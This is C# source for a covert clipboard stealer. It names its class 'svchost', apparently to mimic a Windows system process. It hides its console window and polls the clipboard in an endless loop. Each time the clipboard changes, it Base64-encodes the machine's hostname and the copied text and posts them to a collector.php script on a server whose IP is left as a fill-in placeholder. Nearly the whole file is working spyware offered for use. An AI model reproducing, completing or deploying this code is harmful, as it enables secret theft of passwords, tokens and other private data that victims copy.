using System.IO;
using System.Net;
using System.Reflection.Emit;
using System.Runtime.InteropServices;
using System.Text;

public class svchost
{
    #region Win32

    [DllImport("User32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool IsClipboardFormatAvailable(uint format);

    [DllImport("User32.dll", SetLastError = true)]
    private static extern IntPtr GetClipboardData(uint uFormat);

    [DllImport("User32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool OpenClipboard(IntPtr hWndNewOwner);

    [DllImport("User32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool CloseClipboard();

    [DllImport("Kernel32.dll", SetLastError = true)]
    private static extern IntPtr GlobalLock(IntPtr hMem);

    [DllImport("Kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool GlobalUnlock(IntPtr hMem);

    [DllImport("Kernel32.dll", SetLastError = true)]
    private static extern int GlobalSize(IntPtr hMem);

    private const uint CF_UNICODETEXT = 13U;


    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    const int SW_HIDE = 0;
    const int SW_SHOW = 5;

    #endregion

    public static string GetText()
    {
        if (!IsClipboardFormatAvailable(CF_UNICODETEXT))
            return null;

        try
        {
            if (!OpenClipboard(IntPtr.Zero))
                return null;

            IntPtr handle = GetClipboardData(CF_UNICODETEXT);
            if (handle == IntPtr.Zero)
                return null;

            IntPtr pointer = IntPtr.Zero;

            try
            {
                pointer = GlobalLock(handle);
                if (pointer == IntPtr.Zero)
                    return null;

                int size = GlobalSize(handle);
                byte[] buff = new byte[size];

                Marshal.Copy(pointer, buff, 0, size);

                return Encoding.Unicode.GetString(buff).TrimEnd('\0');
            }
            finally
            {
                if (pointer != IntPtr.Zero)
                    GlobalUnlock(handle);
            }
        }
        finally
        {
            CloseClipboard();
        }
    }




    static void Main()
    {
        var handle = GetConsoleWindow();
        ShowWindow(handle, SW_HIDE);

        HttpClient client = new HttpClient();
        string hostname = Dns.GetHostName();



        string server_ip = "<YOU SERVER IP HERE>";


        
        string previous_data = "";
        string data = "";

        while (true)
        {
            try
            {
                data = GetText();

                if (data.ToString() != previous_data.ToString())
                {
                    previous_data = data.ToString();
                    var values = new Dictionary<string, string>
                    {
                        { "hostname", System.Convert.ToBase64String( System.Text.Encoding.UTF8.GetBytes(hostname) ) },
                        { "data", System.Convert.ToBase64String( System.Text.Encoding.UTF8.GetBytes(data.ToString()) ) }
                    };
                    var content = new FormUrlEncodedContent(values);
                    var response = client.PostAsync("http://" + server_ip + "/collector.php", content);
                    var responseString = response.Result.ToString();
                    Thread.Sleep(1000);
                }
            }
            catch (NullReferenceException ex)
            {
                //Console.WriteLine(ex.ToString());
            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
            }

        }
    }
}